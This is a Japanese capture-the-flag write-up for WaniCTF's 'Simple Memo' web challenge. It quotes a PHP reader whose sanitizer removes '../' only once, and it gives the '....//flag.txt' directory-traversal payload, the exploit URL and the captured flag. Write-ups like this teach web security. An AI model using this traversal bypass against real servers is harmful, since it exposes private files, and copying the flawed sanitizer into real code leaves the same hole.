# Simple Memo:Web:101pts
問題ページ：[https://simple.wanictf.org/](https://simple.wanictf.org/)  
flag.txtというファイルに私の秘密を隠したが、 完璧にサニタイズしたため辿りつける訳がない。  
(Hint) ディレクトリトラバーサルという脆弱性です。  
何がサニタイズされているかを知るためにソースコード(reader.php)を参考にしてみてください。  
(注意)  
simple_memo.zipは問題を解くために必須の情報ではなく、docker-composeを利用してローカルで問題環境を再現するためのものです。  
興味のある方は利用してみてください。  
[reader.php](reader.php)　　　　[simple_memo.zip](simple_memo.zip)  

# Solution
URLにアクセスするとメモが見える。  
The シンプル メモ張  
[site.png](site/site.png)  
メモは以下のようになっている。  
[memos](site/memos)  
flag.txtに秘密が隠されているようだ。  
配られたreader.phpを見ると以下のようであった。  
```php:reader.php
<?php
function reader($file) {
  $memo_dir = "./memos/";

  // sanitized
  $file = str_replace('../', '', $file);
  
  $filename = $memo_dir . $file;
  $memo_exist = file_exists($filename);
  if ($memo_exist) {
    $content = file_get_contents($filename);
  } else {
    $content = "No content.";
  }
  return $content;
}
?>
```
`../`を削除しているのみなので、`....//`は`../`となる。  
つまり`....//flag.txt`を見てやればよい。  
`https://simple.wanictf.org/index.php?file=....//flag.txt`を見るとflagが表示された。  
flag  
[flag.png](site/flag.png)  

## FLAG{y0u_c4n_get_hi5_5ecret_fi1e}